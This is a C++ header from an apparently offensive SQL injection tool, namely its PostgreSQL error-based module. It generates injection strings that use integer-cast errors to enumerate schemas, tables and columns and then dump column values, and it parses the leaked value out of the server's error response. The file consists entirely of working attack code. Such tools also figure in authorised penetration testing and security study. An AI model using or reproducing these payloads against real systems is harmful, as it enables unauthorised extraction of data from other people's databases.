#ifndef POSTGRESQL_ERROR_BASED
#define POSTGRESQL_ERROR_BASED

#include "../../Vaccine.hpp"
#include "../mysql/mysql.hpp"

struct postgresql_error_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                const std::string index_str = *config[ERROR_BASED_INDEX];
                int index = std::stoi(index_str);
                *config[ERROR_BASED_INDEX] = std::to_string(index + 1);

                switch (type)
                {
                case DATABASES:
                        return "' OR 1=cast((SELECT '~' || schema_name "
                               "FROM information_schema.schemata "
                               "LIMIT 1 OFFSET " +
                               index_str + ") as integer)-- ";
                case TABLES:
                        return "' OR 1=cast((SELECT '~' || table_name "
                               "FROM information_schema.tables "
                               "WHERE table_schema='" +
                               *config[ERROR_BASED_DATABASE] + "' " +
                               "LIMIT 1 OFFSET " +
                               index_str + ") as integer)-- ";
                case COLUMNS:
                        return "' OR 1=cast((SELECT '~' || column_name "
                               "FROM information_schema.columns "
                               "WHERE table_schema='" +
                               *config[ERROR_BASED_DATABASE] + "' " +
                               "AND table_name='" +
                               *config[ERROR_BASED_TABLE] + "' " +
                               "LIMIT 1 OFFSET " +
                               index_str + ") as integer)-- ";
                case VALUES:
                        return "' OR 1=cast((SELECT '~' || " +
                               *config[ERROR_BASED_COLUMN] + "::text " +
                               "FROM " + *config[ERROR_BASED_DATABASE] + "." +
                               *config[ERROR_BASED_TABLE] + " " +
                               "LIMIT 1 OFFSET " +
                               index_str + ") as integer)-- ";
                default:
                        return std::string();
                }
        };

        static str_vector parser(const Json::Value& entries, sptr_vector& config)
        {
                std::string response;
                str_vector values;
                for (const auto& member : entries.getMemberNames())
                {
                        try
                        {
                                response = entries[member].asString();
                        }
                        catch (const std::exception& _)
                        {
                                response = "NOT_CONVERTIBLE";
                        }
                        const size_t start = response.find("\"~");
                        const size_t end = response.find_first_of("\"", start + 1);
                        if (start == std::string::npos || end == std::string::npos)
                                continue;

                        const std::string value = response.substr(
                            start + 2, end - start - 2);
                        if (value.empty())
                                continue;
                        values.push_back(value);
                        break;
                }
                if (values.empty())
                        *config[ERROR_BASED_INDEX] = "0";
                return values;
        };
};
#endif